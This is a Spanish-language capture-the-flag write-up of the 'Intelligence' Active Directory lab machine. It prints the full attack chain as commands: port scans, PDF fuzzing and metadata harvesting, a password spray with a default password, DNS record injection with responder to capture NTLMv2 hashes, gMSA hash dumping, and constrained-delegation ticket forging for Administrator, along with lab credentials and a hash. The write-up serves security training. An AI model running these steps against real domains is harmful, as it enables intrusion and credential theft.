---
title: Intelligence
published: true
categories: [Active Directory,Medium]
tags: [Active directory explotation, Metadata, Privilege abuse, gMSA abuse, Constrained delegation] 
author: Alejandro Rivera
image:
  path: https://user-images.githubusercontent.com/55555187/162420637-330e4359-e676-44da-b456-8a1f930ac346.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Intelligence es una <font color="#FFC300">máquina Medium</font> de temática <font color="#8E44AD">Active Directory</font> en la que se toca enumeración y fuzzeo de un servicio web, extracción de Metadata de archivos pdf, password spray attack, enumeración del servicio samba, inyección de dns records y envenenamiento de tráfico, pivoting, gMSA password dumping y Silver Ticket attack.

## Reconocimiento

Una vez que detecto que la máquina está operativa, procedo a lanzar un escaneo de puertos con nmap.

```
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.248
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/162411537-e066052c-648b-44f8-8c28-22f9d3ad9f86.png" title="" alt="recon1" width="308">

Lanzo un escaneo con nmap para determinar la versión y servicio de los puertos.

```
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49711,49717,51882 10.10.10.248
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/162411539-9db511a2-076d-40b7-a62c-9edf9675ae22.png" title="" alt="recon2" width="602">

Los puertos que más me llaman la atención son, el puerto 80 que tiene un servicio web, el 88 que pertenece a Kerberos, el 389 de ldap, el 5985 de winRM y el 139 y el 445 de Samba.

Lo primero que hago es un reconocimiento del servicio web y descubro que se me permite acceder a dos documentos de tipo pdf y que ambos tienen la siguiente url:


<img src="https://user-images.githubusercontent.com/55555187/162411544-084012ef-9e3d-4941-ac9e-bc0e69e66252.png" title="" alt="web1" width="641">

Viendo esto lo que hago es, a través de un one liner en bash, fuzzear para buscar posibles pdfs anteriores que se les haya olvidado retirar.

```
for year in {2019..2021}; do for month in {00..12}; do for day in {00..31}; do wget http://10.10.10.248/documents/$year-$month-$day-upload.pdf; done; done; done
```

Obteniendo una gran cantidad de documentos:

![pdf0](https://user-images.githubusercontent.com/55555187/162412392-9038df27-8c73-45c7-8b89-9a719d23afb9.png)

Viendo esto lo primero que hago es mirar los **Metadata** de uno de los pdfs para comprobar si tiene algún dato útil como por ejemplo el usuario creador. Observo que efectivamente, contiene el usuario creador y decido extraer dicho campo de todos los documentos mediante un one liner y la utilidad **pdfinfo** (también se puede hacer mediante **exiftool**).

<img src="https://user-images.githubusercontent.com/55555187/162411533-1b574e87-0534-4b09-8ad3-a6d2e3a1ba57.png" title="" alt="pdf1" width="371">

```
for file in *.pdf; do pdfinfo $file | grep "Creator:"; done
```

<img src="https://user-images.githubusercontent.com/55555187/162411534-c7e1d2cf-390b-4983-b3c6-e13911f20c4a.png" title="" alt="pdf2" width="512">

Con esto ya tenemos una lista de usuarios potenciales, estos usuarios se pueden validar haciendo uso de **kerbrute** pero antes de nada decido ver si algún pdf contiene información útil, para ello los convierto a texto mediante la utilidad **pdftotext** ya que en linux, por defecto, no se puede listar el contenido de un pdf.

```
for file in *.pdf; do pdftotext -layout "$file"; done
```

![pdf3](https://user-images.githubusercontent.com/55555187/162413054-296d1aea-55aa-437f-91b9-003d8571cda2.png)

Revisando los contenidos descubro un par de cosas interesantes.

1- Se nos habla de un usuario Ted que ha escrito un script para identificar cuando la web está caida, puede que podamos aprovecharnos de eso en un futuro.

![web2](https://user-images.githubusercontent.com/55555187/162411548-88d4235b-5192-47ec-8191-1fd9ed28243d.png)

2- Observo el post de bienvenida de la compañía donde se expone la contraseña por defecto asociada a nuevas cuentas.

<img src="https://user-images.githubusercontent.com/55555187/162411532-f3673c0e-da94-44df-b0af-a3221564424e.png" title="" alt="pdf1 5" width="612">

## Obtención de acceso

Teniendo una lista de usuarios potenciales y una contraseña, lanzo un ataque password spray con crackmapexec para ver si algún usuario no ha cambiado la contraseña.

```
crackmapexec smb 10.10.10 -u users.txt -p NewIntelligenceCorpUser9876
```

![fh1](https://user-images.githubusercontent.com/55555187/162411551-c9258894-8da2-4e39-8b16-cc9534de9645.png)

Obtenemos una credencial válida. Compruebo si pertenece al grupo **Remote Management Users** con crackmapexec por si me pudiese conectar al equipo mediante **evil-winrm** pero no es el caso. 

Como está el servicio Samba abierto, compruebo si el usuario Tiffany.Molina tiene alguna carpeta compartida a la que se pueda acceder.

<img src="https://user-images.githubusercontent.com/55555187/162411554-80cc3d0e-23a6-4dce-9a92-7d08dbae93c2.png" title="" alt="fh2" width="632">

Veo dos carpetas interesantes, la carpeta **IT** y la carpeta **Users**. Decido listas sus contenidos recursivamente.

```
smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -R Users
```

![fh3](https://user-images.githubusercontent.com/55555187/162411557-5724fb8d-e44e-41c3-844a-6642c3bb13b7.png)

![fh4](https://user-images.githubusercontent.com/55555187/162411562-27340a82-8d8f-47e5-8595-4a47bce85f00.png)

En la carpeta Users no encontramos nada relevante (excepto la flag user.txt, claro) que podamos usar para pivotar, obtener una shell o escalar privilegios. Listo el contenido de la carpeta IT.

```
smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -R IT
```

![fh5](https://user-images.githubusercontent.com/55555187/162411563-d05f3529-b9f1-4980-9923-9e59a37392f6.png)

En esta carpeta observamos el famoso script de Ted, me lo bajo y lo examino en mi máquina.

<img src="https://user-images.githubusercontent.com/55555187/162411564-5de381fd-77f4-431d-8657-e4760c0bb2de.png" title="" alt="fh6" width="677">

Como se puede ver, lo que hace este script es ir recorriendo los **dns record** buscando los que empiezan por *web*. Investigando sobre el tema descubro que existe una utilidad llamada **dnstool.py** de **krbrelayx** que nos permite inyectar **dns records** si tenemos los permisos suficiente. Teniendo un usuario del sistema decido probar a ver si tiene dichos privilegios subiendo un dns record que apunte a mi máquina.

```
dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web_intelligence --data 10.10.14.38 -t A
```

![fh7](https://user-images.githubusercontent.com/55555187/162411566-5e1c79e4-6c54-404a-aa7c-4b415d27a421.png)

Como hemos podido leer en el código, el script se ejecuta cada 5 minutos, dicho script lo más probable es que esté siendo ejecutado en el contexto del usuario Ted. La idea es ponerse en escucha mediante **responder.py** (que es un envenenador de tráfico) para intentar obtener el **hash NTLMv2** del usuario que esté ejecutando el script cuando dicho script acceda a contenido de el dns record que acabamos de inyectar (es decir, mi IP) para luego intentar crackearlo y obtener una contraseña.

Me pongo en escucha mediante el responder y después de 5 minutos recibo el hash NTLMv2 del usuario **Ted.Graves**

```
responder.py -I tun0 
```

![fh8](https://user-images.githubusercontent.com/55555187/162411567-90fc55c5-abc8-4079-a87d-ea8a09b6df6e.png)

Crackeando el hash mediante **John** obtengo la contraseña de Ted.Graves.

<img src="https://user-images.githubusercontent.com/55555187/162411513-d52356fc-c36e-423d-b7ee-00ef7c336c50.png" title="" alt="fh9" width="631">

Valido la credencial y miro si Ted pertenece al grupo Remote Management Users para conectarme mediante evil-winrm al servicio winrm.

![fh10](https://user-images.githubusercontent.com/55555187/162411519-e5ef6baf-334b-41c9-84c0-8eca84632272.png)

La credencial es válida pero no tenemos acceso a la máquina aún.

## Escalada de privilegios

Viendo que todavía no tengo ninguna vía potencial para entrar con una shell, decido lanzar **bloodhound** para enumerar los servicios internos de esta.

Para obtener la información lanzo la utilidad **bloodhound-python.py**.

```
bloodhound-python.py -c All -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -d intelligence.htb
```

Una vez en bloodhound, marco a Tiffany y a Ted como Owned y empiezo a observar sus relaciones para ver si puedo aprovecharme de algo.  Al rato observo algo interesante, Ted, al ser miembro de ITSupport, puede leer la GMSAP (Secure Group Managed Service Account) password de la cuenta SVC_INT, es decir, tenemos una posible vía para pivotar de nuevo.

<img title="" src="https://user-images.githubusercontent.com/55555187/162411522-21ccfce6-f53f-4727-8a31-bf85827d8feb.png" alt="fh11" width="481">

Utilizando la utilidad **gMSADumper.py** dumpeo el hash de la cuenta svc_int.

![fh12](https://user-images.githubusercontent.com/55555187/162411526-c5fe7e6e-ad87-4999-aad5-4e48443f7759.png)

Observando los atributos de svc_int descubro que tiene permisos para realizar una **constrained delegation** pudiendo impersonar a cualquier usuario de la máquina.

<img src="https://user-images.githubusercontent.com/55555187/162411528-2d4f01b9-8bf9-4b93-a709-3a690055e28e.png" title="" alt="fh13" width="610">

A través de la utilidad **getST.py** de **Impacket** ejecuto un **Silver Ticket attack** en el que me creo un **TGS** para acceder a la máquina como el usuario **Administrator**.

```
getST.py -spn WWW/dc.intelligence.htb intelligence.htb/svc_int$ -hashes :a5fd76c71109b0b483abe309fbc92ccb -impersonate Administrator 
```

*Nota: el SPN se puede obtener desde bloodhound observando los atributos de svc_int.*



Una vez que obtengo el TGS, exporto su ruta a la variable **KRB5CCNAME** y me conecto al sistema como Administrator mediante **psexec.py**.

![fh14](https://user-images.githubusercontent.com/55555187/162411530-7f7cbda5-e4ac-40b0-b269-a53e43dd5fca.png)

*Nota: Es posible que al obtener el ticket o lanzar psexec Kerberos nos reporte un error Clock skew too great, para solucionarlo basta con usar utilidades como rdate o ntpdate para sincronizarnos con la máquina vícitima. Es importante tener el servicio ntp habilitado.*
